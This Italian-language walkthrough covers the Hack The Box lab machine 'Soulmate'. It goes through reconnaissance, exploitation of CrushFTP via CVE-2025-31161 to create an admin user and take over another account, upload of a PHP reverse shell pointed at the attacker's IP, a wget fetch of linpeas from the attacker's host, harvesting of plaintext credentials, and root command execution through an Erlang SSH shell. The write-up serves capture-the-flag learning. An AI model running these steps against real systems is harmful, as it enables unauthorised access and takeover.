# Macchina Soulmate

IP vittima: 10.10.11.86
IP attaccante: 10.10.14.27

## Recon

Probabile che per accedere al sito dal browser occorra inserire in nel file `/etc/hosts`:
`10.10.11.86 soulmate.htb`

### sito http (porta 80)

![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251104202249.png)
Nel sito è possibile iscriversi ed accedere alla propria pagina.

### namp

`sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.86`

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-04 20:07 CET
Nmap scan report for 10.10.11.86
Host is up (0.045s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
4369/tcp open  epmd

Nmap done: 1 IP address (1 host up) scanned in 12.12 seconds
```

`sudo nmap -sC -sV -O -p22,80 10.10.11.86`

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-04 20:08 CET
Nmap scan report for soulmate.htb (10.10.11.86)
Host is up (0.023s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Soulmate - Find Your Perfect Match
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (95%), Linux 5.0 - 5.4 (95%), Linux 3.1 (94%), Linux 3.2 (94%), Linux 5.3 - 5.4 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), Linux 5.0 (94%), Linux 5.0 - 5.5 (94%), HP P2000 G3 NAS device (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.18 seconds
```

### gobuster

`gobuster dir -u http://soulmate.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak`

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soulmate.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 16688]
/login.php            (Status: 200) [Size: 8554]
/register.php         (Status: 200) [Size: 11107]
/profile.php          (Status: 302) [Size: 0] [--> /login]
/assets               (Status: 301) [Size: 178] [--> http://soulmate.htb/assets/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/dashboard.php        (Status: 302) [Size: 0] [--> /login]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================
```

### ffuf

`ffuf -u http://10.10.11.86 -H "Host: FUZZ.soulmate.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 4`

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.86
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.soulmate.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 34ms]
:: Progress: [4989/4989] :: Job [1/1] :: 1652 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

**Importante!** Con [[ffuf]] troviamo il sottodominio `ftp.soulmate.htb`

## ftp.soulmate.htb (porta 80)

Probabile che per accedere al sito dal browser occorra inserire in nel file `/etc/hosts`:
`10.10.11.86 ftp.soulmate.htb`
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251104203751.png)
La pagina ospita un server `Crush FTP` 
**Crush FTP** è un **server FTP (File Transfer Protocol)** avanzato, scritto in **Java**, che supporta **molteplici protocolli di trasferimento file**, non solo FTP tradizionale. È usato per gestire trasferimenti di file sicuri e automatizzati tra server e client.
Se ispezioniamo il codice sorgente della pagina troviamo la versione di Crush FTP:
`</script> <!--GSIGNIN_SCRIPT--><!--MSSIGNIN_SCRIPT--><!--AZURE_B2C_SINGIN_SCRIPT--><!--AMAZON_COGNITO_SINGIN_SCRIPT--><!--SAML_SIGNIN_SCRIPT--><!--OIDC_SIGNIN_SCRIPT--><!--##COVERIMAGEPATH##--><script></script><script type=module crossorigin src="[/WebInterface/new-ui/assets/app/components/loader2.js?v=11.W.657-2025_03_08_07_52]`
La versione è la **11.W.657** che è vulnerabile all'exploit **CVE-2025-31161** che possiamo sfruttare:
https://github.com/Immersive-Labs-Sec/CVE-2025-31161
Per poter sfruttare l'exploit dobbiamo conoscere lo username di un utente già esistente (--target_user); basta creare un nuovo utente attraverso il sito http (soulmate.htb) e utilizzare lo username dell'utente creato.
Una volta scaricato il file python dell'exploit proviamo a lanciarlo con il comando:
`python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user xerand --new_user xerand2 --password 1234`
che creerà un nuovo utente con permessi da amministratore (user: xerand2, password: 1234). 
Ora possiamo accedere come amministratori:
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251104222952.png)
Accediamo alla pagina `Admin/User Manager`, clicchiamo sull'utente `ben` e cambiamo la sua password (123456) e salviamo.
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251104223411.png)
Poi usciamo e rilogghiamo come utente `ben`:
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251104223701.png)
Se accediamo alla cartella `webProd` troviamo tutti i file php utilizzati dal sito. Possiamo caricare una reverse shell php per ottenere un accesso. Clicchiamo su `Add files` e carichiamo la reverse shell che troviamo in questa repository (file chiamato `reverseshell.php`):
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
Inserendo il nostro IP e la nostra porta in ascolto:

```php
$ip = '10.10.14.27';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
```

Ci mettiamo in ascolto sulla porta 4444 (`nc -lvnp 4444`) e poi visitiamo la pagina `http://soulmate.htb/reverseshell.php` ottenendo la shell come utente `www-data`

## www-data

Ora che siamo entrati carichiamo [[linpeas]]per ottenere informazioni.
Dopo aver tirato su un server python dove teniamo linpeas (`python3 -m http.server 3000`) .andiamo nella cartella `/tmp/` della macchina vittima e scarichiamo linpeas con `wget http://10.10.14.27:3000/linpeas.sh`.
Dopo avergli dato i permessi di esecuzione (`chmod +x linpeas.sh`) lo lanciamo (`./linpeas.sh`).
linpeas trova che su **localhost** ci sono diverse porte aperte:

```
╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
══╣ Active Ports (netstat)
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1174/nginx: worker  
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:38387         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:4369            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:2222          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:45247         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      1174/nginx: worker  
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::4369                 :::*                    LISTEN      -                   
```

Se visitiamo la porta `2222` con `nc localhost 2222` vediamo che è utilizzato `SSH-2.0-Erlang/5.2.9`
Sempre con linpeas troviamo molti file correlati con `erlang`:

```
╔══════════╣ Executable files potentially added by user (limit 70)
2025-08-27+09:28:26.8565101180 /usr/local/sbin/laurel
2025-08-15+07:46:57.3585015320 /usr/local/lib/erlang_login/start.escript
2025-08-14+14:13:10.4708616270 /usr/local/sbin/erlang_login_wrapper
2025-08-14+14:12:12.0726103070 /usr/local/lib/erlang_login/login.escript
2025-08-06+10:44:17.9697674470 /usr/local/lib/erlang/bin/start_erl
2025-08-06+10:44:17.9537674200 /usr/local/lib/erlang/erts-15.2.5/bin/start
2025-08-06+10:44:17.9537674200 /usr/local/lib/erlang/bin/start
2025-08-06+10:44:17.9497674140 /usr/local/lib/erlang/erts-15.2.5/bin/erl
2025-08-06+10:44:17.9497674140 /usr/local/lib/erlang/bin/erl
2025-08-06+10:44:16.6617653190 /usr/local/lib/erlang/lib/diameter-2.4.1/bin/diameterc
2025-08-06+10:44:16.5777651820 /usr/local/lib/erlang/lib/odbc-2.15/priv/bin/odbcserver
2025-08-06+10:44:16.4497649740 /usr/local/lib/erlang/lib/observer-2.17/priv/bin/etop
2025-08-06+10:44:16.4497649740 /usr/local/lib/erlang/lib/observer-2.17/priv/bin/cdv
2025-08-06+10:44:15.7417638210 /usr/local/lib/erlang/lib/os_mon-2.10.1/priv/bin/memsup
2025-08-06+10:44:15.7417638210 /usr/local/lib/erlang/lib/os_mon-2.10.1/priv/bin/cpu_sup
2025-08-06+10:44:15.6217636250 /usr/local/lib/erlang/lib/crypto-5.5.3/priv/lib/otp_test_engine.so
2025-08-06+10:44:15.6217636250 /usr/local/lib/erlang/lib/crypto-5.5.3/priv/lib/crypto_callback.so
2025-08-06+10:44:15.6177636190 /usr/local/lib/erlang/lib/crypto-5.5.3/priv/lib/crypto.so
2025-08-06+10:44:15.4817633970 /usr/local/lib/erlang/lib/mnesia-4.23.5/examples/bench/bench.sh
2025-08-06+10:44:14.9937626030 /usr/local/lib/erlang/lib/wx-2.4.3/priv/erl_gl.so
2025-08-06+10:44:14.9897625960 /usr/local/lib/erlang/lib/wx-2.4.3/priv/wxe_driver.so
2025-08-06+10:44:14.5457618730 /usr/local/lib/erlang/lib/asn1-5.3.4/priv/lib/asn1rt_nif.so
2025-08-06+10:44:14.3697615850 /usr/local/lib/erlang/lib/erl_interface-5.5.2/bin/erl_call
2025-08-06+10:44:13.9097608360 /usr/local/lib/erlang/lib/snmp-5.18.2/bin/snmpc
2025-08-06+10:44:13.7297605420 /usr/local/lib/erlang/lib/edoc-1.3.2/priv/edoc_generate
2025-08-06+10:44:13.6337603850 /usr/local/lib/erlang/lib/edoc-1.3.2/bin/edoc
2025-08-06+10:44:13.3617599410 /usr/local/lib/erlang/lib/inets-9.3.2/priv/bin/runcgi.sh
```

Balza all'occhio questa directory `/usr/local/lib/erlang_login/` che contiene due file:

```
-rwxr-xr-x 1 root root 1570 Aug 14 14:12 login.escript
-rwxr-xr-x 1 root root 1427 Aug 15 07:46 start.escript
```

Se visualizziamo `start.escript` troviamo elle credenziali di accesso:
`{user_passwords, [{"ben", "HouseH0ldings998"}]},`

## ssh (porta 22)

Proviamo ad accedere al servizio ssh con le credenziali trovate (username: ben, password: HouseH0ldings998 )
`ssh ben@10.10.11.86` con password `HouseH0ldings998`
Accediamo al sistema come utenete `ben`.
Nella cartella `/home/ben` troviamo il file `user.txt` che contiene la userflag.

## Scalata dei privilegi

Con `sudo -l` vediamo che l'utente ben non può utilizzare `sudo` (Sorry, user ben may not run sudo on soulmate.)
Proviamo quindi ad accedere al servizio `eralng SSH` presente sulla porta 2222 di localhost con le credenziali di `ben` (username: ben, password: HouseH0ldings998 ):
`ssh ben@localhost -p 2222` con password `HouseH0ldings998`
Riusciamo ad accedere al servizio erlang.
Il modo più semplice per eseguire comandi di sistema in erlang è con la sintassi:
`os:cmd("<COMANDO>").` (vedi https://vuln.be/post/os-command-and-code-execution-in-erlang-and-elixir/)
Se lanciamo il comando `os:cmd("id").` vediamo che siamo root:
`"uid=0(root) gid=0(root) groups=0(root)\n"`
Nella cartella `/root/` è presente il file `/root.txt` che contiene la rootflag. La possiamo visualizzare con:
`os:cmd("cat /root/root.txt").`
